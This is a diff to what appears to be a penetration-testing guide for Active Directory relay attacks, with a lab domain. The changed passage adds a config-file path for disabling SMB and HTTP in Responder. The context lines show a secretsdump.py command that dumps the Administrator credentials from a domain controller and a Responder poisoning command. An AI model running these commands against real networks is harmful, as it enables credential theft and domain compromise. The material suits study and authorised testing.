@@ -14,7 +14,7 @@
    `secretsdump.py winlab.csnc.ch/hostname$@dc.winlab.csnc.ch -just-dc -just-dc-user Administrator`   
    
  Note: If you want, you can run Responder at the same time, but in that case you have to disable SMB and HTTP server for Responder:   
- - Start Responder.py with SMB and HTTP disabled:   
+ - Start Responder.py with SMB and HTTP disabled: (disable them in /root/vkoch/Responder/Responder.conf)   
    `sudo /opt/Responder/Responder.py -I eth1 -w -r -f -d`   
 
 ## Using the socks connection
